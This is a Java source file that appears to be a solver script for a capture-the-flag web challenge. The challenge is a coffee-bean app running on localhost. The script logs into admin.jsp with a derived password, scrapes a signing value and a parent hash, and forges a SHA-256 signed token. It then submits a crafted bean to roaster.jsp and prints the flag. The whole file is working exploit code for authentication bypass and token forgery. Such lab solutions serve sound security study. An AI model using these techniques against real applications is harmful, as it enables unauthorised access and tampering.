package solver;

import com.google.common.hash.Hashing;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.ArrayList;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.io.IOException;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.jsoup.Jsoup;

public class BeanSolve {

  public static String getSign() throws UnsupportedEncodingException, IOException {
    CloseableHttpClient httpclient = HttpClients.createDefault();
    HttpPost httppost = new HttpPost("http://localhost:8080/admin.jsp");
    String pass = "Pas$ion";
    PasswordMatch passmatch = new PasswordMatch(pass);
    String altpass = passmatch.generate(pass);
    List<NameValuePair> params = new ArrayList<NameValuePair>(1);
    params.add(new BasicNameValuePair("password", altpass));
    httppost.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));

    HttpResponse response = httpclient.execute(httppost);
    HttpEntity entity = response.getEntity();

    if (entity != null) {
      InputStream instream = entity.getContent();
      try {
        java.util.Scanner s = new java.util.Scanner(instream).useDelimiter("\\A");
        Document doc = Jsoup.parse(s.hasNext() ? s.next() : "");
        Elements password = doc.select("div.col-sm-auto");
        String sign = password.first().html();
        return sign;
      } finally {
        instream.close();
      }
    }
    return null;
  }

  public static String getHash() throws UnsupportedEncodingException, IOException {
    CloseableHttpClient httpclient = HttpClients.createDefault();
    HttpGet httpget = new HttpGet("http://localhost:8080/breed.jsp");

    HttpResponse response = httpclient.execute(httpget);
    HttpEntity entity = response.getEntity();
    if (entity != null) {
      InputStream instream = entity.getContent();
      try {
        java.util.Scanner s = new java.util.Scanner(instream).useDelimiter("\\A");
        Document doc = Jsoup.parse(s.hasNext() ? s.next() : "");
        Elements options = doc.select("select[name=parent1]").select("option");
        String hash = options.attr("value");
        return hash;
      } finally {
        instream.close();
      }
    }
    return null;
  }

  public static void submitBean(String parentHash, String name) throws UnsupportedEncodingException, IOException {
    CloseableHttpClient httpclient = HttpClients.createDefault();
    HttpPost httppost = new HttpPost("http://localhost:8080/roaster.jsp");

    List<NameValuePair> params = new ArrayList<NameValuePair>(1);
    params.add(new BasicNameValuePair("parent1", parentHash));
    params.add(new BasicNameValuePair("parent2", parentHash));
    params.add(new BasicNameValuePair("bean-name", name));
    params.add(new BasicNameValuePair("bean-desc", ""));
    httppost.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));

    HttpResponse response = httpclient.execute(httppost);
    HttpEntity entity = response.getEntity();

    if (entity != null) {
      InputStream instream = entity.getContent();
      try {
        java.util.Scanner s = new java.util.Scanner(instream).useDelimiter("\\A");
        Document doc = Jsoup.parse(s.hasNext() ? s.next() : "");
        System.out.println(doc);
      } finally {
        instream.close();
      }
    }
  }

  public static Elements getFlag() throws UnsupportedEncodingException, IOException {
    CloseableHttpClient httpclient = HttpClients.createDefault();
    HttpGet httpget = new HttpGet("http://localhost:8080");

    HttpResponse response = httpclient.execute(httpget);
    HttpEntity entity = response.getEntity();
    if (entity != null) {
      InputStream instream = entity.getContent();
      try {
        java.util.Scanner s = new java.util.Scanner(instream).useDelimiter("\\A");
        Document doc = Jsoup.parse(s.hasNext() ? s.next() : "");
        Elements options = doc.select("tbody");
        return options;
      } finally {
        instream.close();
      }
    }
    return null;
  }

  public static void main(String[] args) throws UnsupportedEncodingException, IOException {
    String sign = getSign();

    String basehash = getHash().split("-")[0];

    // Fill in hash to flag

    final String hashed = Hashing.sha256()
          .hashString(basehash + "-" + sign, StandardCharsets.UTF_8)
          .toString();
    String result = basehash + "-" + hashed;
    submitBean(result, "test");
    System.out.println(getFlag());
  }
}
